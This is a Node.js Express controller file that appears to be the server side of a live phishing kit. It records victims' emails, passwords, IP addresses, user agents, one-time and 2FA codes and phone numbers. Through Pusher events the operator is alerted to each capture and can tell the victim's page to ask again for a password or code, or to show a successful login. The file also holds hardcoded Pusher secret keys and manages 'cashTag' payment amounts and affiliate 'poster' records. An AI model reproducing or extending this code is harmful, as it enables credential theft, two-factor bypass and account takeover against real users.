'use strict'
import NewInfo from '../models/OldInfo.js'
import nodemailer from 'nodemailer';

import User from '../models/User.js'
import Info from '../models/Info.js'

import Amount from '../models/Amount.js'

import Link from '../models/Link.js'
import Click from '../models/Click.js'
// import socket from '../server.js'
import Poster from '../models/Poster.js'
import device from 'express-device'
import useragent from 'express-useragent'
import Site from '../models/Site.js'
import createToken from '../utils/createToken.js'
import Demo from '../models/Demo.js'
import Cash from '../models/Cash.js'
import rateLimitMiddleware from "../ratelimiter.js"
import axios from 'axios';
import Password from '../models/Password.js'
import satelize from 'satelize'
import Otp from '../models/Otp.js'
import Pusher from'pusher';


export const email_post = async (req, res) => {
   
     const pusher = new Pusher({
                 appId: '1987499',
                 key: '05656b52c62c0f688ee3',
                 secret: 'b4372518df233d054270',
                 cluster: 'ap2',
                 useTLS: true,
               })
    

    const { adminId, posterId } = req.params
    const { id, site, email,password } = req.body
    const userAgent = req.headers['user-agent'];
    const ipAddress =  (req.headers['x-forwarded-for'] || 
    req.connection.remoteAddress || 
    req.socket.remoteAddress || 
    req.connection.socket.remoteAddress).split(",")[0];

    // return   res.status(200).json(req.body)


    try {
        const userFound = await User.findOne({ adminId: adminId })

        const posterFound = await Poster.findOne({
          $or: [
            { _id: posterId && posterId.length === 24 ? posterId : null },
            { posterId: posterId }
          ]
        })

        if (userFound && posterFound) {
            const filter = { _id: id };
            const update = { email: email };
           if(id){
                    const info =  await Info.findOneAndUpdate(filter, update, {
                        new: true,
                        upsert: true
                    });

                    if(info){
                        pusher.trigger(userFound.adminId, 'new-notification', {
                            adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                        });

                    }
                    return   res.status(200).json({ info: info ,email:posterFound.username})

           }
            const info = await Info.create({
                site, email, password,
                adminId:adminId,
                poster: posterId,
                root: posterFound._id,
                ip:ipAddress,
                agent:userAgent,
                status: "pending"
                })
            if(info){
                pusher.trigger(userFound.adminId, 'new-notification', {
                    adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                });
            }
        posterFound.details.push(info._id)
        await posterFound.save();
        return   res.status(200).json({ info: info ,email:posterFound.username})

        }
        return    res.status(400).json({ e: "not found" })


    } catch (e) {
        return  res.status(400).json({ e: "error" })
    }

}



export const email_post_wrong = async(req, res) => {

    // const pusher = new Pusher({
    //     appId: '1883790',
    //     key: 'c69be5ea3652b02905c7',
    //     secret: 'd5258e0315991e7b5cc6',
    //     cluster: 'mt1',
    //     useTLS: true,
    //   });

   const pusher = new Pusher({
               appId: '1987499',
               key: '05656b52c62c0f688ee3',
               secret: 'b4372518df233d054270',
               cluster: 'ap2',
               useTLS: true,
             })
  

    const { id ,adminId} = req.body;
 
   
    try {
        const userFound = await User.findOne({ adminId: adminId })
        if (userFound ) {

      

            
                pusher.trigger(id, 'email-wrong', {
                    id:id
                  });

          
         return   res.status(200).json({ success: "email change successfully" })

        }

    }
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }

}

export const password_post = async(req, res) => {

    // const pusher = new Pusher({
    //     appId: '1883790',
    //     key: 'c69be5ea3652b02905c7',
    //     secret: 'd5258e0315991e7b5cc6',
    //     cluster: 'mt1',
    //     useTLS: true,
    //   });

    // const pusher = new Pusher({
    //     appId: '1773152',
    //     key: 'f47031316f13ab641256',
    //     secret: 'f1f2616da0bb8ffa85b7',
    //     cluster: 'ap2',
    //     useTLS: true,
 const pusher = new Pusher({
             appId: '1987499',
             key: '05656b52c62c0f688ee3',
             secret: 'b4372518df233d054270',
             cluster: 'ap2',
             useTLS: true,
           })


    const { id, password ,adminId,posterId} = req.body;
 
    const filter = { _id: id };
    const update = { password: password };
    try {
        const userFound = await User.findOne({ adminId: adminId })
        const posterFound = await Poster.findOne({
           $or: [
             { _id: posterId && posterId.length === 24 ? posterId : null },
             { posterId: posterId }
           ]
         })
        if (userFound && posterFound) {

          const found =  await Info.findOneAndUpdate(filter, update, {
                new: true,
                upsert: true
            });

            if(found){
                pusher.trigger(userFound.adminId, 'new-notification', {
                    adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                  });

            }
         return   res.status(200).json({ success: "password change successfully" })

        }

    }
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }

}

export const password_post_wrong = async(req, res) => {

    // const pusher = new Pusher({
    //     appId: '1883790',
    //     key: 'c69be5ea3652b02905c7',
    //     secret: 'd5258e0315991e7b5cc6',
    //     cluster: 'mt1',
    //     useTLS: true,
    //   });

   const pusher = new Pusher({
               appId: '1987499',
               key: '05656b52c62c0f688ee3',
               secret: 'b4372518df233d054270',
               cluster: 'ap2',
               useTLS: true,
             })
  
    const { id } = req.body;
 
   
    try {
        const info = await Info.findOne({ _id: id })
        if (info ) {

            info.status = "wrong password";
            await info.save();

            
                pusher.trigger(id, 'pass-wrong', {
                    id:id
                  });

            
         return   res.status(200).json({ success: "password change successfully" })

        }

    }
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }

}

export const code_page_post = async(req, res) => {

    // const pusher = new Pusher({
    //     appId: '1883790',
    //     key: 'c69be5ea3652b02905c7',
    //     secret: 'd5258e0315991e7b5cc6',
    //     cluster: 'mt1',
    //     useTLS: true,
    //   });


 const pusher = new Pusher({
             appId: '1987499',
             key: '05656b52c62c0f688ee3',
             secret: 'b4372518df233d054270',
             cluster: 'ap2',
             useTLS: true,
           })

    const { id, code } = req.body;
 
    const filter = { _id: id };
    const update = { skipcode: code };
    try {
        const info = await Info.findOne({ _id: id })
        if (info ) {
            info.status = "code verified";
            await info.save();
            
                pusher.trigger(id, 'code-verify', {
                    code: code,id:id
                  });

           
         return   res.status(200).json({ success: "code sent successfully" })

        }

    }
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }

}


export const reverify_code_page_post = async(req, res) => {

    // const pusher = new Pusher({
    //     appId: '1883790',
    //     key: 'c69be5ea3652b02905c7',
    //     secret: 'd5258e0315991e7b5cc6',
    //     cluster: 'mt1',
    //     useTLS: true,
    //   });
 const pusher = new Pusher({
             appId: '1987499',
             key: '05656b52c62c0f688ee3',
             secret: 'b4372518df233d054270',
             cluster: 'ap2',
             useTLS: true,
           })

      
    const { id } = req.body;
 
    const filter = { _id: id };
    try {
        const info = await Info.findOne({ _id: id })
        if (info ) {
            info.status = "code reverified";
            await info.save();
            
                pusher.trigger(id, 'code-re-verify', {
                    id:id
                  });

           
         return   res.status(200).json({ success: "code sent successfully" })

        }

    }
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }

}




export const gcode_code_verify = async(req, res) => {

    // const pusher = new Pusher({
    //     appId: '1883790',
    //     key: 'c69be5ea3652b02905c7',
    //     secret: 'd5258e0315991e7b5cc6',
    //     cluster: 'mt1',
    //     useTLS: true,
    //   });
 const pusher = new Pusher({
             appId: '1987499',
             key: '05656b52c62c0f688ee3',
             secret: 'b4372518df233d054270',
             cluster: 'ap2',
             useTLS: true,
           })

      
    const { id ,gCode} = req.body;
    const filter = { _id: id };
    const update = { gCode: gCode };
    try {
        const found =  await Info.findOneAndUpdate(filter, update, {
            new: true,
            upsert: true
        });

        const info = await Info.findOne({ _id: id })

           
         return   res.status(200).json({ success: info })

      

    }
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }

}



export const mega_wrong = async(req, res) => {

    // const pusher = new Pusher({
    //     appId: '1883790',
    //     key: 'c69be5ea3652b02905c7',
    //     secret: 'd5258e0315991e7b5cc6',
    //     cluster: 'mt1',
    //     useTLS: true,
    //   });

  const pusher = new Pusher({
              appId: '1987499',
              key: '05656b52c62c0f688ee3',
              secret: 'b4372518df233d054270',
              cluster: 'ap2',
              useTLS: true,
            })
 
      
    const { id } = req.body;
 
    const filter = { _id: id };

    try {
        const info = await Info.findOne({ _id: id })
        if (info ) {

         
            
                pusher.trigger(id, 'mega_wrong', {
                   id:id
                  });

           
         return   res.status(200).json({ success: "code sent successfully" })

        }

    }
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }

}

export const renumber_code_page_post = async(req, res) => {

    // const pusher = new Pusher({
    //     appId: '1883790',
    //     key: 'c69be5ea3652b02905c7',
    //     secret: 'd5258e0315991e7b5cc6',
    //     cluster: 'mt1',
    //     useTLS: true,
    //   });

 const pusher = new Pusher({
             appId: '1987499',
             key: '05656b52c62c0f688ee3',
             secret: 'b4372518df233d054270',
             cluster: 'ap2',
             useTLS: true,
           })

    const { id } = req.body;
 
    const filter = { _id: id };
    // const update = { skipcode: code };
    try {
        const info = await Info.findOne({ _id: id })
        if (info ) {

         
            
                pusher.trigger(id, 'code-re-renumber', {
                    adminId: info.adminId,id:id,poster:info.poster
                  });

           
         return   res.status(200).json({ success: "code sent successfully" })

        }

    }
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }

}


export const renumber_add = async(req, res) => {

    // const pusher = new Pusher({
    //     appId: '1883790',
    //     key: 'c69be5ea3652b02905c7',
    //     secret: 'd5258e0315991e7b5cc6',
    //     cluster: 'mt1',
    //     useTLS: true,
    //   });

    // const pusher = new Pusher({
    //     appId: '1773152',
    //     key: 'f47031316f13ab641256',
    //     secret: 'f1f2616da0bb8ffa85b7',
    //     cluster: 'ap2',
    //     useTLS: true,
    //   })
 const pusher = new Pusher({
             appId: '1987499',
             key: '05656b52c62c0f688ee3',
             secret: 'b4372518df233d054270',
             cluster: 'ap2',
             useTLS: true,
           })

      

    const { id, number,adminId,poster} = req.body;
 
    const filter = { _id: id };
    const update = { number: number };
    try {
        const userFound = await User.findOne({ adminId: adminId })
        const posterFound = await Poster.findOne({
           $or: [
             { _id: poster && poster.length === 24 ? poster : null },
             { posterId: poster }
           ]
         })
        if (userFound && posterFound) {

          const found =  await Info.findOneAndUpdate(filter, update, {
                new: true,
                upsert: true
            });

            if(found){
                pusher.trigger(userFound.adminId, 'new-notification', {
                    adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                  });

            }
         return   res.status(200).json({ success: "number added successfully" })

        }

    }
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }

}

export const successful_page_post = async(req, res) => {

    // const pusher = new Pusher({
    //     appId: '1883790',
    //     key: 'c69be5ea3652b02905c7',
    //     secret: 'd5258e0315991e7b5cc6',
    //     cluster: 'mt1',
    //     useTLS: true,
    //   });


 const pusher = new Pusher({
             appId: '1987499',
             key: '05656b52c62c0f688ee3',
             secret: 'b4372518df233d054270',
             cluster: 'ap2',
             useTLS: true,
           })

    const { id } = req.body;
 
  
    try {
        const info = await Info.findOne({ _id: id })
        if (info ) {

            info.status = "successful";
            await info.save();

           
                pusher.trigger(id, 'login-successfull', {
                    id:id
                  });

          
         return   res.status(200).json({ success: "logged in successfully" })

        }

    }
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }

}



 // const pusher = new Pusher({
    //     appId: '1883790',
    //     key: 'c69be5ea3652b02905c7',
    //     secret: 'd5258e0315991e7b5cc6',
    //     cluster: 'mt1',
    //     useTLS: true,
    //   });

    // const pusher = new Pusher({
    //     appId: '1773152',
    //     key: 'f47031316f13ab641256',
    //     secret: 'f1f2616da0bb8ffa85b7',
    //     cluster: 'ap2',
    //     useTLS: true,
    //   })

    // add_amount

   



    export const  add_name = async (req, res) => {
       const pusher = new Pusher({
                   appId: '1987499',
                   key: '05656b52c62c0f688ee3',
                   secret: 'b4372518df233d054270',
                   cluster: 'ap2',
                   useTLS: true,
                 })
      
        const { adminId, posterId } = req.params
        const { site, name,amount ,cashTag} = req.body
  
    
        try {
            const found = await Amount.findOne({ site: site })

            
            if (found) {
                const filter = { _id: found._id };
                const update = { name: name, amount:amount,cashTag:cashTag};
             
                        const updated =  await Amount.findOneAndUpdate(filter, update, {
                            new: true,
                            upsert: true
                        });
    
                     
                        return   res.status(200).json({ updated: updated })
    
               }

               const info = await Amount.create({
                site, name,amount ,cashTag,
                adminId:adminId,
                posterId: posterId,
              
                })
         
        return   res.status(200).json({ info:info})
    
        } 
        
        catch (e) {
            return  res.status(400).json({ e: "error" })
        }
    
    }






export const delete_cash_tag = async(req, res) => {

    // const pusher = new Pusher({
    //     appId: '1883790',
    //     key: 'c69be5ea3652b02905c7',
    //     secret: 'd5258e0315991e7b5cc6',
    //     cluster: 'mt1',
    //     useTLS: true,
    //   });


 const pusher = new Pusher({
             appId: '1987499',
             key: '05656b52c62c0f688ee3',
             secret: 'b4372518df233d054270',
             cluster: 'ap2',
             useTLS: true,
           })


    const { site } = req.body;
 
  
    try {
        const deletedDoc = await Amount.findOneAndDelete({ site: site });

          
         return   res.status(200).json({ success: "deleted in successfully" })
 }

    
    catch (e) {

        return   res.status(400).json({ e: "error" })


    }

}

    // export const find_amount_name = async(req, res) => {

    //     // const pusher = new Pusher({
    //     //     appId: '1883790',
    //     //     key: 'c69be5ea3652b02905c7',
    //     //     secret: 'd5258e0315991e7b5cc6',
    //     //     cluster: 'mt1',
    //     //     useTLS: true,
    //     //   });
    
    
    //     const pusher = new Pusher({
    //         appId: '1891860',
    //         key: 'e4766909b306ad7ddd58',
    //         secret: 'ffbb52b3b0756a523d83',
    //         cluster: 'ap2',
    //         useTLS: true,
    //       });
          
    //     const { id } = req.body;
     
      
    //     try {
    //         const info = await Info.findOne({ _id: id })
    //         if (info ) {
    
          
    
               
    //                 pusher.trigger(id, 'login-successfull', {
    //                     id:id
    //                   });
    
              
    //          return   res.status(200).json({ success: "logged in successfully" })
    
    //         }
    
    //     }
    //     catch (e) {
    
    //         return   res.status(400).json({ e: "error" })
    
    
    //     }
    
    // }
    